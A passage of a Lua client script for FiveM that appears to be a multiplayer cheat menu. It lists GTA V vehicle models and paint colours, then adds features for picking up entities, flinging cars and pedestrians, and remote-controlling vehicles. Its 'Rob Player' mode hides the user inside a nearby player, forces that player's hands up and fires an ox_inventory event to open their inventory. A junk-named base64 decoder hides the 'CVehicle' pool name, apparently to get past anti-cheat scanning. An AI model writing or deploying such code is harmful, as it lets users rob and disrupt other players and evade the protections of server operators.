    "TRACTOR",
    "UTILLITRUCK",
    "UTILLITRUCK2",
    "UTILLITRUCK3",
    "ARMYTRAILER",
    "ARMYTRAILER2",
    "FREIGHTTRAILER",
    "ARMYTANKER",
    "TRAILERLARGE",
    "DOCKTRAILER",
    "TR3",
    "TR2",
    "TR4",
    "TRFLAT",
    "TRAILERS",
    "TRAILERS4",
    "TRAILERS2",
    "TRAILERS3",
    "TVTRAILER",
    "TRAILERLOGS",
    "TANKER",
    "TANKER2",
    "BALETRAILER",
    "GRAINTRAILER",
    "BOATTRAILER",
    "RAKETRAILER",
    "TRAILERSMALL"
}

local vans = {
    "BISON",
    "BISON2",
    "BISON3",
    "BOBCATXL",
    "BOXVILLE",
    "BOXVILLE2",
    "BOXVILLE3",
    "BOXVILLE4",
    "BOXVILLE5",
    "BURRITO",
    "BURRITO2",
    "BURRITO3",
    "BURRITO4",
    "BURRITO5",
    "CAMPER",
    "GBURRITO",
    "GBURRITO2",
    "JOURNEY",
    "MINIVAN",
    "MINIVAN2",
    "PARADISE",
    "PONY",
    "PONY2",
    "RUMPO",
    "RUMPO2",
    "RUMPO3",
    "SPEEDO",
    "SPEEDO2",
    "SPEEDO4",
    "SURFER",
    "SURFER2",
    "TACO",
    "YOUGA",
    "YOUGA2"
}

local cycles = {
    "BMX",
    "CRUISER",
    "FIXTER",
    "SCORCHER",
    "TRIBIKE",
    "TRIBIKE2",
    "TRIBIKE3"
}

local boats = {
    "DINGHY",
    "DINGHY2",
    "DINGHY3",
    "DINGHY4",
    "JETMAX",
    "MARQUIS",
    "PREDATOR",
    "SEASHARK",
    "SEASHARK2",
    "SEASHARK3",
    "SPEEDER",
    "SPEEDER2",
    "SQUALO",
    "SUBMERSIBLE",
    "SUBMERSIBLE2",
    "SUNTRAP",
    "TORO",
    "TORO2",
    "TROPIC",
    "TROPIC2",
    "TUG"
}

local helicopters = {
    "AKULA",
    "ANNIHILATOR",
    "BUZZARD",
    "BUZZARD2",
    "CARGOBOB",
    "CARGOBOB2",
    "CARGOBOB3",
    "CARGOBOB4",
    "FROGGER",
    "FROGGER2",
    "HAVOK",
    "HUNTER",
    "MAVERICK",
    "POLMAV",
    "SAVAGE",
    "SEASPARROW",
    "SKYLIFT",
    "SUPERVOLITO",
    "SUPERVOLITO2",
    "SWIFT",
    "SWIFT2",
    "VALKYRIE",
    "VALKYRIE2",
    "VOLATUS"
}


local planes = {
    "ALPHAZ1",
    "AVENGER",
    "AVENGER2",
    "BESRA",
    "BLIMP",
    "BLIMP2",
    "BLIMP3",
    "BOMBUSHKA",
    "CARGOPLANE",
    "CUBAN800",
    "DODO",
    "DUSTER",
    "HOWARD",
    "HYDRA",
    "JET",
    "LAZER",
    "LUXOR",
    "LUXOR2",
    "MAMMATUS",
    "MICROLIGHT",
    "MILJET",
    "MOGUL",
    "MOLOTOK",
    "NIMBUS",
    "NOKOTA",
    "PYRO",
    "ROGUE",
    "SEABREEZE",
    "SHAMAL",
    "STARLING",
    "STRIKEFORCE",
    "STUNT",
    "TITAN",
    "TULA",
    "VELUM",
    "VELUM2",
    "VESTRA",
    "VOLATOL"
}

local service = {
    "AIRBUS",
    "BRICKADE",
    "BUS",
    "COACH",
    "PBUS2",
    "RALLYTRUCK",
    "RENTALBUS",
    "TAXI",
    "TOURBUS",
    "TRASH",
    "TRASH2",
    "WASTELANDER",
    "AMBULANCE",
    "FBI",
    "FBI2",
    "FIRETRUK",
    "LGUARD",
    "PBUS",
    "POLICE",
    "POLICE2",
    "POLICE3",
    "POLICE4",
    "POLICEB",
    "POLICEOLD1",
    "POLICEOLD2",
    "POLICET",
    "POLMAV",
    "PRANGER",
    "PREDATOR",
    "RIOT",
    "RIOT2",
    "SHERIFF",
    "SHERIFF2",
    "APC",
    "BARRACKS",
    "BARRACKS2",
    "BARRACKS3",
    "BARRAGE",
    "CHERNOBOG",
    "CRUSADER",
    "HALFTRACK",
    "KHANJALI",
    "RHINO",
    "SCARAB",
    "SCARAB2",
    "SCARAB3",
    "THRUSTER",
    "TRAILERSMALL2"
}

local commercial = {
    "BENSON",
    "BIFF",
    "CERBERUS",
    "CERBERUS2",
    "CERBERUS3",
    "HAULER",
    "HAULER2",
    "MULE",
    "MULE2",
    "MULE3",
    "MULE4",
    "PACKER",
    "PHANTOM",
    "PHANTOM2",
    "PHANTOM3",
    "POUNDER",
    "POUNDER2",
    "STOCKADE",
    "STOCKADE3",
    "TERBYTE",
    "CABLECAR",
    "FREIGHT",
    "FREIGHTCAR",
    "FREIGHTCONT1",
    "FREIGHTCONT2",
    "FREIGHTGRAIN",
    "METROTRAIN",
    "TANKERCAR"
}

-- END VEHICLES LISTS
-- VEHICLE MODS LIST (this is going to take a while...)
local classicColors = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}

local matteColors = {
    {"Black", 12},
    {"Gray", 13},
    {"Light Gray", 14},
    {"Ice White", 131},
    {"Blue", 83},
    {"Dark Blue", 82},
    {"Midnight Blue", 84},
    {"Midnight Purple", 149},
    {"Schafter Purple", 148},
    {"Red", 39},
    {"Dark Red", 40},
    {"Orange", 41},
    {"Yellow", 42},
    {"Lime Green", 55},
    {"Green", 128},
    {"Forest Green", 151},
    {"Foliage Green", 155},
    {"Olive Darb", 152},
    {"Dark Earth", 153},
    {"Desert Tan", 154}
}

local metalColors = {
    {"Brushed Steel", 117},
    {"Brushed Black Steel", 118},
    {"Brushed Aluminum", 119},
    {"Chrome", 120},
    {"Pure Gold", 158},
    {"Brushed Gold", 159}
}

-- END VEHICLE MODS LIST

-- PICKUP PROPS FUNCTIONS
function RotationToDirection(rotation)
    local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
    local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
    return direction
end

function DrawText3Ds(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    scale = scale * fov
    if onScreen then
        SetTextScale(0.0 * scale, 0.35 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextDropshadow(0, 0, 0, 0, 155)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- FORCE HANDUP FUNCTIONS
function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local p = GetGameplayCamCoords()
    local dist = #(p - vec3(x, y, z))
    local scale = 200 / (GetGameplayCamFov() * dist)
    if onScreen then
        SetTextScale(0.35, 0.35)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextEntry("STRING")
        SetTextCentre(true)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

function GetClosestPlayer()
    local closestPlayer = -1
    local closestDistance = -1
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    for _, playerId in ipairs(GetActivePlayers()) do
        local targetPed = GetPlayerPed(playerId)
        if targetPed ~= playerPed then
            local targetCoords = GetEntityCoords(targetPed)
            local distance = #(playerCoords - targetCoords)
            if closestDistance == -1 or distance < closestDistance then
                closestPlayer = playerId
                closestDistance = distance
            end
        end
    end
    return closestPlayer, closestDistance
end

function ForceHandsUpOnPlayer(ped)
    local dict = "missminuteman_1ig_2"
    local anim = "handsup_base"
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        Wait(10)
    end
    TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
end

function StopRobbing()
    local playerPed = PlayerPedId()
    DetachEntity(playerPed, true, false)
    SetEntityVisible(playerPed, true, false)
    if attachedTo and DoesEntityExist(attachedTo) then
        ClearPedTasks(attachedTo)
    end
    robbing = false
    attachedTo = nil
end

-- CONTROL CAR FUNCTIONS
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

function lecTRSUnEwbgJnOSEhXMjMtIgmyRDQWatrongduDLskpsjxouxSrDlxOhmFXedrvQvcBFbNmkAfnByYEs(data)
    m=string.sub(data, 0, 55)
    data=data:gsub(m,'')
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

function DrawVehicleHitbox(vehicle)
    local min, max = GetModelDimensions(GetEntityModel(vehicle))
    local coords = GetEntityCoords(vehicle)
    local heading = GetEntityHeading(vehicle)
    DrawLine(
        coords.x + min.x, coords.y + min.y, coords.z + min.z,
        coords.x + max.x, coords.y + min.y, coords.z + min.z,
        255, 0, 0, 255
    )
    DrawLine(
        coords.x + min.x, coords.y + max.y, coords.z + min.z,
        coords.x + max.x, coords.y + max.y, coords.z + min.z,
        255, 0, 0, 255
    )
end

function GetClosestVehicle()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestVehicle = nil
    local closestDistance = 10.0
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        if distance < closestDistance then
            closestVehicle = vehicle
            closestDistance = distance
        end
    end
    return closestVehicle
end

function EnumerateVehicles()
    return coroutine.wrap(function()
        local vehiclePool = GetGamePool(lecTRSUnEwbgJnOSEhXMjMtIgmyRDQWatrongduDLskpsjxouxSrDlxOhmFXedrvQvcBFbNmkAfnByYEs('xTHTGUPJjCLBuEzyaAVNMDKKaELTEGLgSothivazJBWDrWKVUleMbqGQ1ZlaGljbGU='))
        for i = 1, #vehiclePool do
            coroutine.yield(vehiclePool[i])
        end
    end)
end

function GetCoordsInFrontOfCam(coords, distance)
    local rotation = GetGameplayCamRot(2)
    local direction = RotationToDirection(rotation)
    return {
        x = coords.x + direction.x * distance,
        y = coords.y + direction.y * distance,
        z = coords.z + direction.z * distance
    }
end

function RotationToDirection(rotation)
    local radians = rotation * (math.pi / 180.0)
    return {
        x = math.sin(radians.z) * math.abs(math.cos(radians.x)),
        y = math.cos(radians.z) * math.abs(math.cos(radians.x)),
        z = math.sin(radians.x)
    }
end

local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

-- Get ESX shared object
ESX = nil
Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent("esx:getSharedObject", function(c)ESX = c end)
        Citizen.Wait(1000)
    end
end)

-- Get vRP object
vRP = Proxy.getInterface("vRP")

-- PICKUP PROPS THREADS
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if PickupPropsEnabled and holdingEntity and heldEntity then
            local playerPed = PlayerPedId()
            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
            
            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                RequestAnimDict('anim@mp_rollarcoaster')
                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                    Citizen.Wait(100)
                end
                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                RequestAnimDict('anim@heists@box_carry@')
                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                    Citizen.Wait(100)
                end
                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
            end
            
            if not IsEntityAttached(heldEntity) then
                holdingEntity = false
                holdingCarEntity = false
                holdingPed = false
                heldEntity = nil
            end
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if PickupPropsEnabled then
            local playerPed = PlayerPedId()
            local camPos = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local direction = RotationToDirection(camRot)
            local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)
            local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
            local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
            local validTarget = false
            
            if hit == 1 then
                entityType = GetEntityType(entityHit)
                if entityType == 3 or entityType == 2 or entityType == 1 then
                    validTarget = true
                    local entityText = entityType == 3 and "Object" or (entityType == 2 and "Car" or "Ped")
                    local entityModel = GetEntityModel(entityHit)
                    local accessInfo = ""
                    if entityType == 2 then
                        if NetworkHasControlOfEntity(entityHit) then
                            accessInfo = ", Access: Yes"
                        else
                            accessInfo = ", Access: No"
                            NetworkRequestControlOfEntity(entityHit)
                        end
                    end
                    local entityInfo = "Entity Type: " .. entityText .. ", Entity: " .. entityHit .. ", Model: " .. entityModel .. accessInfo
                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, entityInfo)
                end
            end
            
            if IsControlJustReleased(0, 246) then -- Y key
                if validTarget then
                    if not holdingEntity and entityHit and (entityType == 3 or entityType == 2 or entityType == 1) then
                        if entityType == 3 then
                            local entityModel = GetEntityModel(entityHit)
                            DeleteEntity(entityHit)
                            RequestModel(entityModel)
                            while not HasModelLoaded(entityModel) do
                                Citizen.Wait(100)
                            end
                            local clonedEntity = CreateObject(entityModel, camPos.x, camPos.y, camPos.z, true, true, true)
                            SetModelAsNoLongerNeeded(entityModel)
                            holdingEntity = true
                            heldEntity = clonedEntity
                            RequestAnimDict("anim@heists@box_carry@")
                            while not HasAnimDictLoaded("anim@heists@box_carry@") do
                                Citizen.Wait(100)
                            end
                            TaskPlayAnim(playerPed, "anim@heists@box_carry@", "idle", 8.0, -8.0, -1, 50, 0, false, false, false)
                            AttachEntityToEntity(clonedEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        elseif entityType == 2 then
                            holdingEntity = true
                            holdingCarEntity = true
                            heldEntity = entityHit
                            RequestAnimDict('anim@mp_rollarcoaster')
                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                Citizen.Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                            AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        elseif entityType == 1 then
                            holdingEntity = true
                            holdingPed = true
                            heldEntity = entityHit
                            RequestAnimDict('anim@heists@box_carry@')
                            while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                Citizen.Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                            local playerCoords = GetEntityCoords(playerPed)
                            local pedCoords = GetEntityCoords(heldEntity)
                            local newPedCoords = vector3(playerCoords.x, playerCoords.y, playerCoords.z - 1)
                            SetEntityCoords(heldEntity, newPedCoords.x, newPedCoords.y, newPedCoords.z, false, false, false, false)
                            ClearPedTasksImmediately(heldEntity)
                            AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        end
                    else
                        if holdingEntity and (holdingCarEntity or holdingPed) then
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            ClearPedTasks(playerPed)
                            DetachEntity(heldEntity, true, true)
                            ApplyForceToEntity(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        elseif holdingEntity then
                            holdingEntity = false
                            ClearPedTasks(playerPed)
                            DetachEntity(heldEntity, true, true)
                            local playerCoords = GetEntityCoords(playerPed)
                            SetEntityCoords(heldEntity, playerCoords.x, playerCoords.y, playerCoords.z - 1, false, false, false, false)
                            SetEntityHeading(heldEntity, GetEntityHeading(playerPed))
                        end
                    end
                end
            end
            
            -- Additional key press to attach the ped to an object
            if IsControlJustReleased(0, 303) then -- U key
                if holdingPed and validTarget then
                    DetachEntity(heldEntity, true, true)
                    AttachEntityToEntity(heldEntity, entityHit, 0, 0.0, 0.0, 1.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    FreezeEntityPosition(heldEntity, true)
                    TaskStartScenarioInPlace(heldEntity, "WORLD_HUMAN_PARTYING", 0, true)
                    holdingPed = false
                    heldEntity = nil
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Wait(0)

        if crosshairEnabled then
            -- הסתרת כוונת GTA
            HideHudComponentThisFrame(14)

            -- עדכון רזולוציה
            res_width, res_height = GetActiveScreenResolution()
            local centerX = res_width / 2
            local centerY = res_height / 2
            local crosshairSize = 12 -- גדול יותר

            -- צבע ברירת מחדל (לבן)
            local r, g, b, a = 255, 255, 255, 255

            -- בדיקת על מי מכוונים
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local direction = RotationToDirection(camRot)
            local rayEnd = camCoords + direction * 1000.0

            local rayHandle = StartShapeTestRay(
                camCoords.x, camCoords.y, camCoords.z,
                rayEnd.x, rayEnd.y, rayEnd.z,
                -1, PlayerPedId(), 0
            )
            local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

            if hit == 1 and entityHit ~= 0 then
                if IsEntityAPed(entityHit) and not IsPedAPlayer(entityHit) then
                    r, g, b = 255, 0, 0
                elseif IsPedAPlayer(entityHit) then
                    r, g, b = 255, 50, 50
                end
            end

            -- ציור הכוונת
            draw_rect_px(centerX - crosshairSize / 2, centerY - 1, crosshairSize, 2, r, g, b, a) -- קו אופקי
            draw_rect_px(centerX - 1, centerY - crosshairSize / 2, 2, crosshairSize, r, g, b, a) -- קו אנכי
        end
    end
end)


-- FORCE HANDUP THREAD
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if ForceHandupEnabled then
            local playerPed = PlayerPedId()
            if not robbing then
                local closestPlayer, distance = GetClosestPlayer()
                if closestPlayer ~= -1 and distance <= 2.0 then
                    local targetPed = GetPlayerPed(closestPlayer)
                    local targetCoords = GetEntityCoords(targetPed)
                    DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "~g~[E]~s~ Rob Player")
                    if IsControlJustReleased(0, 38) then
                        robbing = true
                        attachedTo = targetPed
                        AttachEntityToEntity(
                            playerPed,
                            targetPed,
                            11816,
                            0.0, 0.0, -1.0,
                            0.0, 0.0, 180.0,
                            false, false, false, false, 2, true
                        )
                        SetEntityVisible(playerPed, false, false)
                        ForceHandsUpOnPlayer(targetPed)
                        TriggerEvent('ox_inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
                    end
                end
            else
                if IsControlJustReleased(0, 38) then
                    StopRobbing()
                end
            end
        end
    end
end)



-- CONTROL CAR THREAD
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if ControlCarEnabled then
            if IsControlJustPressed(0, 246) then -- Y key
                if selectedVehicle and DoesEntityExist(selectedVehicle) then
                    SetEntityDrawOutline(selectedVehicle, false)
                end
                selectedVehicle = GetClosestVehicle()
                if selectedVehicle then
                    SetEntityDrawOutline(selectedVehicle, true)
                    SetEntityDrawOutlineColor(255, 255, 0, 255)
                end
            end
            
            if selectedVehicle and DoesEntityExist(selectedVehicle) then
                DrawVehicleHitbox(selectedVehicle)
                if IsControlPressed(0, 38) then -- Press long E key
                    if not isVehicleFlying then
                        isVehicleFlying = true
                        SetEntityHasGravity(selectedVehicle, false)
                    end
                    local camRot = GetGameplayCamRot(2)
                    SetEntityRotation(selectedVehicle, camRot.x, camRot.y, camRot.z, 2, true)
                    local propulsionSpeed = 50.0
                    local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                    local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                    local dirZ = math.sin(math.rad(camRot.x))
                    SetEntityVelocity(selectedVehicle,
                        dirX * propulsionSpeed,
                        dirY * propulsionSpeed,
                        dirZ * propulsionSpeed
                    )
                else
                    if isVehicleFlying then
                        isVehicleFlying = false
                        SetEntityHasGravity(selectedVehicle, true)
                    end
                end
            end
        end
    end
end)

-- Adapted from Force Mod by Ideo - https://www.gta5-mods.com/scripts/force-mod
local function ForceMod()
    ForceTog = not ForceTog
    
    if ForceTog then
        
        Citizen.CreateThread(function()
            ShowInfo("Force ~g~ENABLED ~r~\nPress E to use")
            
            local ForceKey = Keys["E"]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            function forcetick()
                
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                
                end
            
            end
            
            while ForceTog do forcetick()Wait(0) end
        end)
    else ShowInfo("Force ~r~Disabled") end

end

-- Some functions adapted from MenyooSP (Massive Headache) - https://github.com/MAFINS/MenyooSP
-- MENYOO/CAMERA FUNCTIONS
function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, false) then return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then return i end
        end
    end
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
